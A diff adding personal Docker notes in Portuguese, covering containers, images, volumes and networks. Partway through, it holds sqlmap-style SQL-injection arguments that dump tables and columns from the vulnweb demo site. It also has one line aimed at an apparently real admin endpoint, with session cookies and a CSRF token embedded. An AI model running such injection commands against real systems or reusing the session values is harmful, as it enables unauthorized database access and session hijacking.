@@ -1,0 +1,99 @@
+Mostrar conteiners ativos
+docker ps
+==================================
+Mostrar todos conteiners
+docker ps -a
+==================================
+Ocupar o terminar (attached)
+docker run -it <imagem>
+==================================
+Não ocupar o terminal (Detached)
+docker run -d <imagem>
+==================================
+Parar um conteiner Detached
+docker stop <id>
+==================================
+expor uma porta meu:imagem
+docker run -p 3030:80 httpd
+
+localhost:3030
+==================================
+reiniciar o container
+docker start <id>
+==================================
+dar nome ao container
+docker run -d -p 3030:80 --name servidor-apache httpd
+docker stop servidor-apache
+docker start servidor-apache
+==================================
+Verificar logs do servidor web
+docker logs servidor-apache
+==================================
+Remover container
+docker rm servidor-apache
+==================================
+buildar uma imagem
+docker build -t clone-server .
+docker image ls
+==================================
+parar e atualizar
+docker stop servidor-apache
+==================================
+remover imagem
+docker rmi <id>
+==================================
+remover tudo que não está sendo utilizado
+docker system prune
+==================================
+configurar volumes meu-pc:conteiner
+docker run -d -p 80:80 -v C:\Users\talliny_nora\Documents\laragon\www\inovar:
+
+
+Build and Start the Containers
+docker-compose up -d
+
+
+
+-u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+
+-u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns
+
+-u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump 
+-u 'https://inovar0258.sicredi.net:443/inovar/admin/adminajax/tabelaUsuarios' --data='situacao%5B%5D=A&carregaTabela=&csrf_inovar=9c311ba6c33ebf7b5288856578e38c28' --headers='Cookie: _Host_csrf_cookie_inovar=9c311ba6c33ebf7b5288856578e38c28; ci_session=n0aol4g0l553u0da0ecj2bis08e4efnl; _pk_ses.1.9f6f=1; _pk_id.1.9f6f=75d800acbce8b188.1658865069.1.1658865149.1658865069.' --cookie='_Host_csrf_cookie_inovar=9c311ba6c33ebf7b5288856578e38c28;ci_session=n0aol4g0l553u0da0ecj2bis08e4efnl;_pk_ses.1.9f6f=1;_pk_id.1.9f6f=75d800acbce8b188.1658865069.1.1658865149.1658865069.'
+
+
+====================================================================================
+Bind Mounts
+docker run -d --name nginx -p 8888:80 -v C:\Users\talliny_nora\Documents\DOCKER\html:/usr/share/nginx/html nginx
+echo $(pwd)
+docker run -d --name nginx -p 8888:80 --mount type=bind,source="$(pwd)"/html,target=/usr/share/nginx/html nginx
+
+
+docker build -t talliny/nginx-com-vim:latest .
+
+docker rm $(docker ps -a -q) -f
+
+
+docker run --rm -it -v $(pwd)/:/usr/src/app -p 3000:3000 node:15 bash
+docker run --rm -it -v C:/Users/talliny_nora/Documents/docker/node/:/usr/src/app -p 3000:3000 node:15 bash
+
+=========* NETWORK *===========================================================================
+
+docker network
+
+Commands:
+  connect     Connect a container to a network
+  create      Create a network
+  disconnect  Disconnect a container from a network
+  inspect     Display detailed information on one or more networks
+  ls          List networks
+  prune       Remove all unused networks
+  rm          Remove one or more networks
+
+
+docker network create --driver bridge minharede
+docker network connect minharede ubutu3
+
+
+container acessar o meu computador
+http://host.docker.internal:port
